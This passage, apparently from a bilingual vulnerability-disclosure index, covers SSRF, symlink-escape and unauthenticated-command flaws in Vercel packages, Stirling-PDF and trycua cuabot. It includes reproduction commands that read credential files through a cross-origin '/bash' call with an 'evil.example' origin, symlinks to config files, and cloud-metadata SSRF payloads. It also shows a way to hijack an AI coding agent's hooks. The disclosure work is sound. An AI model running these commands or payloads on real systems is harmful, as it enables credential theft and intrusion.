| **40** | [`40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/ja/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)<br/>`VERCEL-NEXT-09`<br/>MITRE CNA-LR & HackerOne #4152265 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/image-optimizer.ts:696-729`<br/>`packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`) | `CWE-918 / CWE-863`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `fetchExternalImage()` (`image-optimizer.js:586-615`) checks `remotePatterns` only on hop 1, not on `3xx` redirects (`09A`). In `validateUrl()`, `isPrivateIp(ip)` fails open (`if (!ipaddr.isValid(ip)) return false`) on Linux hyphenated IPv6 zone indices (`::ffff:127.0.0.1%br-...`) and classifies `::7f00:1` and `64:ff9b:1::/48` as `unicast` (`09B`).<br/>**Scenario A (Same-Host Pathname Bypass):** `/public-avatars/**` redirects to `/private-kyc-docs/passport-scan.png`.<br/>**Scenario B (Cross-Host Allowlist Pivot):** Allowlisted CDN/avatar service redirects to unapproved internal host.<br/>**Scenario C (`09A -> 09B` Direct `127.0.0.1` TCP Loopback SSRF):** Redirects to `::ffff:127.0.0.1%br-...` / `::7f00:1` to read `127.0.0.1` services. | `RED`: `remotePatterns_bypassed: true, loopback_server_hit: true, remote_addr: ::ffff:127.0.0.1`<br/>`GREEN`: `redirect_rechecked: true, fail_closed: true`<br/>HackerOne `#4152265` (+2 Comments) |
| **41** | [`41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/ja/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)<br/>`VERCEL-CLI-07`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`vercel <= 65.4.0`)<br/>`packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`<br/>`packages/cli/src/commands/http-cli/index.ts` | `CWE-200 / CWE-436`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `constructFullUrl()` (`packages/cli/src/commands/curl/utils.ts:179-216`) checks `new URL(normalizedPath, baseUrl).origin === baseUrl` but returns raw `${baseUrl}${normalizedPath}`. For `\\@attacker.com`, WHATWG `URL` keeps `origin === baseUrl`, whereas `libcurl` treats `baseUrl\\` as userinfo and `attacker.com` as host.<br/>**Scenario A (CI/CD Token Exfiltration):** `vercel curl` sends `Authorization: Bearer` and `x-vercel-protection-bypass` to `attacker.com`.<br/>**Scenario B (Developer/Agent CLI Leak):** Malicious path steals live CLI session token.<br/>**Scenario C (Auto-Minted Bypass Leak):** `PATCH /v10/projects/{id}/protection-bypass` mints and leaks project secret. | `RED`: `whatwg_origin_check_passed: true, curl_connected_to_attacker: true, leaked_bearer: true`<br/>`GREEN`: `rejected_backslash_and_globoff: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **42** | [`42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/ja/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)<br/>`VERCEL-FLAGS-CORE-06`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`@vercel/flags-core <= 1.10.2`)<br/>`packages/flags-core/src/controller.ts:555-615`<br/>`packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`) | `CWE-400 / CWE-345`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **How It Happens in Code:** `Controller.streamResponse()` (`controller.ts:555-615`) updates `datafileUpdatedAtWatermark` from the unprefixed `x-datafile-Updated-At` header even on non-`200` responses before validating the datafile payload.<br/>**Scenario A (Kill-Switch Lockout):** Poisoning `x-datafile-Updated-At: 9999999999999` makes the SDK ignore all subsequent legitimate flag updates.<br/>**Scenario B (Missing `redirect: 'manual'`):** Stream fetch follows `3xx` redirects.<br/>**Scenario C (Worker State Drift):** Long-lived Node workers remain permanently frozen on stale flags. | `RED`: `poisoned_watermark: 9999999999999, bundled_update_ignored: true`<br/>`GREEN`: `requires_res_ok_and_bounded_skew: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **43** | [`43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/ja/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)<br/>`VERCEL-FLAGS-05`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`flags <= 4.4.0`)<br/>`packages/flags/src/next/precompute.ts:206-214`<br/>`packages/flags/dist/next/index.js:119-125` (`deserialize`) | `CWE-347`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `deserialize(flags, code, secret)` (`precompute.ts:206-214`) returns `{}` when `code === '__no_flags__'` before verifying the Compact JWS signature, even when `flags.length > 0`.<br/>**Scenario A (Edge Gate Bypass):** Requesting `/__no_flags__/page` skips JWS verification and forces fallback `flag.decide()` execution.<br/>**Scenario B (Cohort Manipulation):** Unauthenticated clients reset signed Edge precomputed cohorts.<br/>**Scenario C (Origin Re-Decide Load):** Forces asynchronous `decide()` execution on precomputed routes. | `RED`: `deserialize('__no_flags__'): {}, getPrecomputed_bypassed_edge_false_to_true: true`<br/>`GREEN`: `requires_flags_length_zero_for_sentinel: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **44** | [`44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/ja/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)<br/>`VERCEL-FIREWALL-01`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/firewall** (`@vercel/firewall <= 1.2.6`)<br/>`packages/firewall/src/rate-limit.ts:138-183, 211-285`<br/>`cmd/ipc-proxy/client.go:34-41, 79-97` | `CWE-918 / CWE-200 / CWE-636`<br/>**7.2 High**<br/>`AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N` | **How It Happens in Code:** `resolveFirewallHost()` (`rate-limit.ts:138-167`) uses the untrusted `Host` header as the outbound HTTPS target when `VERCEL_ENV !== 'production'`, leaking `x-vercel-rate-limit-secret` and `x-vercel-oidc-token`, and fails open (`{ rateLimited: false }`) on errors.<br/>**Scenario A (Secret Exfiltration):** Forged `Host` header steals `VF_RATE_LIMIT_SECRET`.<br/>**Scenario B (Fail-Open Brute-Force):** Malformed `Host` triggers `{ rateLimited: false }` on login/OTP endpoints.<br/>**Scenario C (Go `ipc-proxy` `%s` Bug):** `client.go:38` leaves literal `%s` in `api-%s.vercel.com`. | `RED`: `leaked_rate_limit_secret: rl_secret_LIVE_99887766, fail_open_rateLimited: false`<br/>`GREEN`: `strict_hostname_regex_and_sprintf_fixed: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **45** | [`45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/ja/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)<br/>`VERCEL-CLIENT-08A`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/hashes.ts:115-167`<br/>`packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`) | `CWE-200 / CWE-706`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`) resolves `.vc-config.json` `filePathMap` entries via `path.resolve(cwd, filePath)` without root confinement or `.vercelignore` filtering.<br/>**Scenario A (`.next/required-server-files.json` Leak):** Uploads local `.env` secrets despite `.vercelignore`.<br/>**Scenario B (CI Prebuilt Artifact Traversal):** `../../` entries in `filePathMap` upload host secrets to `/v2/files`.<br/>**Scenario C (Build Cache Poisoning):** Restored `.vc-config.json` exfiltrates runner files. | `RED`: `outside_host_secret_uploaded: true, dotnext_env_secret_uploaded: true`<br/>`GREEN`: `path_confined_to_cwd: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
| **46** | [`46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/ja/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)<br/>`VERCEL-CLIENT-08B`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/index.ts:116-148`<br/>`packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`) | `CWE-59 / CWE-200`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`) resolves `config.bulkRedirectsPath` without `fs.realpath()` root confinement or `.vercelignore` filtering, following symlinks outside `cwd`.<br/>**Scenario A (Symlink Host Read):** Symlink inside `bulkRedirectsPath` uploads `/etc/hostname` or `~/.ssh/id_rsa`.<br/>**Scenario B (`../` Directory Walk):** Parent traversal enumerates and uploads outside directories.<br/>**Scenario C (`.vercelignore` Bypass):** Ignored secret files are uploaded in prebuilt mode. | `RED`: `symlink_target_outside_cwd_uploaded: true`<br/>`GREEN`: `realpath_confinement_and_lstat_enforced: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |

---

### III.01 — Stirling-PDF (`v3.2.2`) — 監視フォルダ（`Watched Folder`）のシンボリックリンク（`Symlink`）脱出による `FolderAccessGuard` バイパス（`GHSA-hpc7-xx5r-gc44`、`CWE-59`/`CWE-61`、CVSS `7.1 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `Stirling-Tools/Stirling-PDF`（`Maven: stirling.software:stirling-pdf`）
* **影響を受けるバージョン & コンポーネント:** `<= v3.2.2`（`commit 684608d143779bf3a8ffc67639f077a1202c62ff`）— `FolderInputSource.java`（`listFiles`、`337-377` 行）、`ProcessingFolderController.java`（`374-380` 行）、`FolderOutputSink.java`（`archiveOriginal`、`338-345` 行）
* **脆弱性分類 & スコア:** `CWE-59`（ファイルアクセス前の不適切なリンク解決）/ `CWE-61`（UNIX シンボリックリンクの追跡）— **CVSS v3.1: `7.1 High`**（`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`）
* **GitHub GHSA リンク:** `GHSA-hpc7-xx5r-gc44`（`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-hpc7-xx5r-gc44`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/01-STIRLING-CAND-02-SYMLINK.md`](advisories/ja/01-STIRLING-CAND-02-SYMLINK.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Stirling-PDF の **自動処理監視フォルダ（Watched Folder）** 機能は、社内ネットワークの共有フォルダ（例: `/mnt/scanner-incoming`）に置かれた文書を自動的に読み取って処理し、出力フォルダ（`/mnt/scanner-processed`）へ保存するために使われます。開発者は、この機能がサーバー自身の機密設定ファイル（`/configs/settings.yml` など）を読み取らないよう、`FolderAccessGuard.isProtected(path)` というセキュリティガードを実装しました。

ところが、Java 標準のファイル判定メソッド `Files.isRegularFile(path)` には重大な落とし穴があります。**第2引数に `LinkOption.NOFOLLOW_LINKS` を指定しない限り、シンボリックリンク（ショートカット）を自動的に追跡し、リンク先が通常ファイルであれば `true` を返してしまう** のです。一方で `FolderAccessGuard.isProtected(path)` は実体パス（`toRealPath()`）ではなく見かけ上の字句パス（`path.toAbsolutePath().normalize()`）しかチェックしません。

`FolderInputSource.java:337-350` にある実際の脆弱なコードは以下の通りです。
```java
private static List<Path> listFiles(
        Path inputDir, boolean recursive, FolderAccessGuard accessGuard) throws IOException {
    List<Path> files = new ArrayList<>();
    if (!recursive) { // デフォルトモード: recursive = false
        try (Stream<Path> entries = Files.list(inputDir)) {
            entries.filter(Files::isRegularFile) // バグ 1: LinkOption.NOFOLLOW_LINKS がないためシンボリックリンクを追跡する！
                    .filter(file -> !hidden(file)) // バグ 2: accessGuard.isProtected(file) すらここで呼ばれていない！
                    .forEach(files::add);
        }
        return files;
    }
```
さらに `ProcessingFolderController.java:374` が後続で `accessGuard.isProtected(path)` を呼んでも、見かけ上の名前は `/mnt/scanner-incoming/invoice.pdf` であるためガードを素通りします。そして最後に `FolderOutputSink.java:342` の `Files.move(originalFile, archiveTarget)` または `Files.copy` がリンク先の実体ファイルを読み取り・移動させてしまいます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — オフィス複合機・スキャナー共有フォルダ（SMB/NFS）経由での管理者・OAuth 秘密情報の窃取:**
  1. 企業内で Stirling-PDF が `/mnt/office-scanner/incoming` フォルダを監視し、処理済み文書を `/mnt/office-scanner/processed` に出力している。
  2. 共有フォルダへの書き込み権限を持つ一般社員または侵害された端末が、`ln -s /configs/settings.yml /mnt/office-scanner/incoming/invoice_2026.pdf` というシンボリックリンクを作成する。
  3. Stirling-PDF のポーリング処理がこのリンクを通常ファイルと誤認して処理・アーカイブし、`/configs/settings.yml` 内の初期管理者パスワード、OAuth2 クライアントシークレット、SMTP 認証情報、API キーが共有出力フォルダへそのままコピーされ、全社員から閲覧可能になる。
* **シナリオ B — SFTP / Nextcloud 自動取込パイプラインにおける `archiveOriginal()` での設定破壊とサービス停止（DoS）:**
  1. 外部取引先が請求書をアップロードする SFTP ディレクトリが Stirling-PDF の監視フォルダに接続されており、処理後に元ファイルをアーカイブする設定になっている。
  2. アップロードされたアーカイブまたは SFTP セッション経由で、アプリケーションのデータファイルや `.env` / 設定ファイルへのシンボリックリンクが配置される。
  3. `FolderOutputSink.archiveOriginal()` が元ファイルを移動（`Files.move`）または上書きし、Stirling-PDF サーバーの設定やデータベースが破損して業務が停止する。
* **シナリオ C — マルチテナント部門別フォルダ間での機密人事・財務文書の横断窃取:**
  1. 同一サーバー上で複数部門（人事部 `/watched/hr`、営業部 `/watched/sales`）の監視フォルダが運用されている。
  2. 営業部フォルダへのアクセス権を持つ攻撃者が、`ln -s /watched/hr/payroll_2026.pdf /watched/sales/scan01.pdf` を配置する。
  3. `staysWithinCanonicalRoot` による正規化ルート境界チェックがないため、営業部の出力フォルダに人事部の給与明細 PDF が複製される。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. Sniper SAST エンジンによる Stirling-PDF 監視フォルダの監査
python3 scripts/sniper-project-audit /path/to/Stirling-PDF --format json --output stirling-audit.json

# 2. ローカル隔離テスト環境での RED -> GREEN ランタイム証明の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand02 -v

# 3. ランタイム証明 JSON 出力の確認
python3 -c 'import json; d=json.load(open("docs/advisories/other-repos-and-cua-real-world-impact-e2e-20261029.json")); print(json.dumps(d["results"]["STIRLING-CAND-02"], indent=2))'
```
**実測ランタイム証明（`RED -> GREEN`）:**
```json
{
  "RED": {
    "recursive": false,
    "symlink_accepted": true,
    "protected_settings_exfiltrated": true,
    "exfiltrated_secret_snippet": "admin_api_key: sk-live-stirling-9988776655"
  },
  "GREEN": {
    "recursive": false,
    "symlink_accepted": false,
    "protected_settings_exfiltrated": false,
    "regular_file_processed": true
  }
}
```

---

### III.02 — Stirling-PDF (`v3.2.2`) — `ConvertWebsiteToPDF.java` における `CVE-2026-71270` の修正漏れと WeasyPrint サブリソース SSRF（`GHSA-ff6j-8xch-j8r6`、`CWE-918`、CVSS `8.6 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `Stirling-Tools/Stirling-PDF`（`Maven: stirling.software:stirling-pdf`）
* **影響を受けるバージョン & コンポーネント:** `<= v3.2.2`（`commit 684608d143779bf3a8ffc67639f077a1202c62ff`）— `ConvertWebsiteToPDF.java`（`urlToPdf`、`116-143` 行 — `POST /api/v1/convert/url/pdf`）
* **脆弱性分類 & スコア:** `CWE-918`（サーバーサイド・リクエスト・フォージェリ / SSRF）— **CVSS v3.1: `8.6 High`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`）
* **GitHub GHSA リンク:** `GHSA-ff6j-8xch-j8r6`（`https://github.com/Stirling-Tools/Stirling-PDF/security/advisories/GHSA-ff6j-8xch-j8r6` — `CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q` の修正漏れ）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md`](advisories/ja/02-STIRLING-CAND-01-WEASYPRINT-SSRF.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
Stirling-PDF には以前に **WeasyPrint が HTML 内の外部リンク（`<link>`、`<img>`、`@import`）を自動的に取得してしまうことで内部ネットワークの情報を盗み出せる SSRF 脆弱性（`CVE-2026-71270` / `GHSA-j5rg-wh78-9f2q`）** が報告されました。開発チームは HTML ファイルアップロード用の `FileToPdf.java` にサニタイザと `--allowed-protocols data`（外部 HTTP 通信の禁止）を追加して修正しました。

しかし、隣のファイルである URL から PDF への変換エンドポイント `ConvertWebsiteToPDF.java`（`POST /api/v1/convert/url/pdf`）には同じ修正が適用されませんでした。
```java
// app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java:116-143
String htmlContent = fetchRemoteHtml(URL); // トップレベル URL のみ SsrfProtectionService で検査される
// バグ 1: customHtmlSanitizer.sanitize(htmlContent) が呼ばれていない！
Files.writeString(tempHtmlInput, htmlContent, StandardCharsets.UTF_8);

List<String> command = new ArrayList<>();
command.add(runtimePathConfig.getWeasyPrintPath());
command.add(tempHtmlInput.toString());
command.add("--base-url");
command.add(URL);
command.add("--pdf-forms");
command.add("--allowed-protocols");
command.add("data,http,https"); // バグ 2: WeasyPrint サブプロセスに任意の http/https 通信を許可している！
```
この結果、攻撃者が用意した公開 Web ページ（`https://example-attacker.com/page.html`）自体は最初のチェックを通過しますが、その HTML の中に `<link rel="stylesheet" href="http://127.0.0.1:8080/internal-secrets.css">` や `<img src="http://169.254.169.254/...">` を書いておくと、**Java の SSRF 防御を一切通らないネイティブの WeasyPrint プロセスが直接内部サーバーへアクセスし、その結果を生成された PDF の中に書き込んで攻撃者へ返してしまう** のです。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — クラウド環境（AWS/GCP/Azure）で稼働する PDF 変換サービスからの IAM 認証情報・メタデータ窃取:**
  1. 社内ポータルや SaaS バックエンドが「Web ページを PDF 保存」機能として Stirling-PDF の `/api/v1/convert/url/pdf` を提供している。
  2. 攻撃者が自前の公開 URL を入力する。そのページの HTML には CSS `content` プロパティや `<object>` / `<link>` でクラウドメタデータ API またはローカル設定エンドポイントへの参照が含まれている。
  3. WeasyPrint が `--allowed-protocols data,http,https` で内部エンドポイントを取得し、返却された PDF ファイルのページ内に内部シークレットが印字されてダウンロードされる。
* **シナリオ B — Kubernetes / Docker 内部ネットワーク上の未認証マイクロサービス（`127.0.0.1` / `10.x.x.x`）の探索とデータ抽出:**
  1. Stirling-PDF コンテナと同一 Pod または同一内部サブネット上で、Spring Boot Actuator（`http://127.0.0.1:8080/actuator/env`）や Prometheus（`http://10.0.0.12:9090/metrics`）が稼働している。
  2. Java の `SsrfProtectionService` は直接 `http://127.0.0.1` を入力すると拒否するが、外部 URL 内の `@import url("http://127.0.0.1:8080/...")` は WeasyPrint が直接取得するため、内部 API レスポンスが PDF 経由で流出する。
* **シナリオ C — HTTP `302` リダイレクトを利用した内部管理画面のレンダリングとファイアウォール回避:**
  1. 攻撃者の公開サーバー上の画像/スタイルシート URL が、初回アクセス時に HTTP `302 Found` で社内イントラネットの管理画面（`http://intranet-admin.local/`）へリダイレクトする。
  2. WeasyPrint の HTTP クライアントがリダイレクトを追跡し、社内管理画面の内容を PDF 化して攻撃者に返す。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ConvertWebsiteToPDF.java 内の --allowed-protocols 設定をソースコードで確認
grep -n -C 12 "allowed-protocols" /path/to/Stirling-PDF/app/core/src/main/java/stirling/software/SPDF/controller/api/converters/ConvertWebsiteToPDF.java

# 2. ローカルループバック（127.0.0.1）を用いた隔離 E2E 検証テストの実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_stirling_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN`）:**
```json
{
  "RED": {
    "weasyprint_allowed_protocols": "data,http,https",
    "internal_subresource_fetched": true,
    "internal_data_embedded_in_pdf": true,
    "internal_loopback_hit_count": 1
  },
  "GREEN": {
    "weasyprint_allowed_protocols": "data",
    "internal_subresource_fetched": false,
    "internal_data_embedded_in_pdf": false,
    "internal_loopback_hit_count": 0
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — 未認証 `0.0.0.0:7842` デーモン + `POST /bash` のワイルドカード CORS + オリジン未検証 WebSocket + 書き込み可能なホスト `.claude` マウント（`GHSA-cp36-x5hg-3gg8`、`CWE-306`/`CWE-942`、CVSS `9.6 Critical`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`npm: cuabot <= 1.0.16`）
* **影響を受けるバージョン & コンポーネント:** `>= 1.0.1, <= 1.0.16`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cuabot/src/cuabotd.ts`（`34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120` 行）
* **脆弱性分類 & スコア:** `CWE-306`（重要機能における認証の欠如）/ `CWE-942`（過度なクロスドメイン許可リスト）— **CVSS v3.1: `9.6 Critical`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-cp36-x5hg-3gg8`（`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/ja/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
`cuabot` は開発者のマシン上で動作する AI エージェント補助ツールです。そのバックグラウンドデーモンである `cuabotd.ts` には、4つの致命的な設計ミスが同時に重なっています。
1. **全ネットワークインターフェースでの未認証公開:** `server.listen(port, ...)`（`1120` 行）にホスト指定がないため、デフォルトの `0.0.0.0:7842` で待受け、パスワードやトークン認証が一切ありません。
2. **すべての Web サイトに API 呼び出しと応答読み取りを許可するワイルドカード CORS:**
   ```typescript
   // libs/cuabot/src/cuabotd.ts:967-974
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') {
     res.writeHead(200);
     res.end();
     return;
   }
   ```
3. **`POST /bash` とオリジン未検証の WebSocket PTY による任意コマンド実行:** `/bash` エンドポイントは送られた JSON の `command` をそのままシェル実行して標準出力を返し、`WebSocketServer`（`741` 行）は `Origin` ヘッダーを確認せずに対話型ターミナルを起動します。
4. **ホストの `.claude` 認証ディレクトリの読み書きマウント:** コンテナ起動時にホスト側の `~/.cuabot/user/.claude` を `/home/community-user/.claude` として読み書き可能でバインドマウントしています（`259-260` 行）。

これにより、開発者が `cuabot` を起動したままブラウザで任意の Web ページ（広告やブログ記事など）を開いた瞬間、そのページ内の JavaScript が `fetch("http://localhost:7842/bash", ...)` を叩いて任意のコマンドを実行し、Claude Code の OAuth トークンを盗み出したり設定を書き換えたりできます。

#### 3. 日常業務で発生し得る3つの重大シナリオ（`シナリオ A / B / C`）
* **シナリオ A — ブラウザで一般の Web ページを開いた瞬間に発生するドライブバイ RCE と Claude OAuth 認証情報の窃取:**
  1. 開発者がローカルで `npx cuabot` を起動して作業しながら、ブラウザで技術ブログやドキュメントサイトを閲覧する。
  2. ページ内のスクリプトが `fetch("http://localhost:7842/bash", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"})})` を送信する。
  3. `Access-Control-Allow-Origin: *` のためブラウザはプリフライト（`OPTIONS`）を通過させ、レスポンス本文（Claude OAuth アクセストークン・リフレッシュトークン）を攻撃者のスクリプトへそのまま渡す。
* **シナリオ B — 書き込み可能な `/home/community-user/.claude/settings.json` への永続的 `PreToolUse` フック注入によるホスト OS 侵害:**
  1. ドライブバイ要求またはクロスサイト WebSocket ハイジャック（`new WebSocket("ws://localhost:7842/?command=bash")`）によって、マウントされた `/home/community-user/.claude/settings.json` が書き換えられる。
  2. 攻撃者が Claude Code の `hooks.PreToolUse` に悪意あるシェルコマンドを登録する。
  3. 以降、開発者がホスト OS 上で Claude Code を使うたびに、ホスト OS 権限でバックドアコマンドが自動実行される。
* **シナリオ C — カフェ・コワーキングスペース・社内 Wi-Fi（`0.0.0.0:7842`）からの直接侵入と画面盗撮:**
  1. 開発者がカフェやオフィス LAN に接続している間、`cuabotd` は `0.0.0.0:7842` で待機している。
  2. 同一 Wi-Fi 上の攻撃者が `curl http://<開発者IP>:7842/screenshot` で開発者の作業画面をリアルタイムに盗撮し、`POST /bash` でワークステーションを完全に制御する。

#### 4. 実行・再現・検証コマンド例
```bash
# 1. ローカル隔離ハーネスにおけるクロスオリジン（Origin: https://evil.example）再現コマンド例
curl -i -X POST http://127.0.0.1:7842/bash \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && cat /home/community-user/.claude/.credentials.json"}'

# 2. Sniper 自動検証テスト（RED -> GREEN + BENIGN）の実行
python3 -m pytest pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand01 -v
```
**実測ランタイム証明（`RED -> GREEN + BENIGN`）:**
```json
{
  "RED": {
    "http_status": 200,
    "access_control_allow_origin": "*",
    "driveby_bash_executed": true,
    "mounted_host_claude_credentials_exfiltrated": true
  },
  "GREEN": {
    "http_status": 403,
    "driveby_bash_executed": false,
    "mounted_host_claude_credentials_exfiltrated": false,
    "error": "Cross-origin browser requests forbidden"
  },
  "BENIGN": {
    "http_status": 200,
    "stdout": "authorized_cli_ok"
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` ワーカーサーバーのワイルドカード CORS + フェイルオープン `OSGYM_ALLOWED_IPS` + 未認証 `POST /reset` による任意モジュール実行（`GHSA-xm8w-gj3g-4f25`、`CWE-94`/`CWE-942`、CVSS `8.8 High`）

#### 1. メタデータ & 開示ステータス
* **対象リポジトリ & パッケージ:** `trycua/cua`（`pip: cua-bench-rl <= 0.1.0` および `cua-bench <= 0.3.1`）
* **影響を受けるバージョン & コンポーネント:** `<= 0.1.0`（`commit e754cfec69c41400eb2aabde716c27d15607b2f0`）— `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py`（`79-108, 338-360, 499` 行）および `libs/cua-bench/cua_bench/core.py`（`make`、`25-51` 行）
* **脆弱性分類 & スコア:** `CWE-94`（コード生成の不適切な制御）/ `CWE-942`（過度なクロスドメイン許可リスト）— **CVSS v3.1: `8.8 High`**（`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`）
* **GitHub GHSA リンク:** `GHSA-xm8w-gj3g-4f25`（`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`）
* **Sniper 個別アドバイザリ:** [`docs/advisories/ja/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/ja/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. コード内でどのように発生し脆弱性へ変化するのか（ステップバイステップの平易な解説）
強化学習（RL）ワーカーサーバー `worker_server.py` は、クライアントから送られた環境パス（`env_path`）を読み込んでタスクを初期化する `POST /reset` API を提供しています。開発者はアクセス制限のために `ip_filter_middleware` を書きましたが、以下の3つのバグが重なっています。
```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # バグ 1: 任意の外部 Web サイトからのブラウザ Fetch を許可！
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    client_ip = request.client.host if request.client else None
    # バグ 2: ブラウザから http://127.0.0.1:8001 へ送られたリクエストは client_ip == "127.0.0.1" になる！
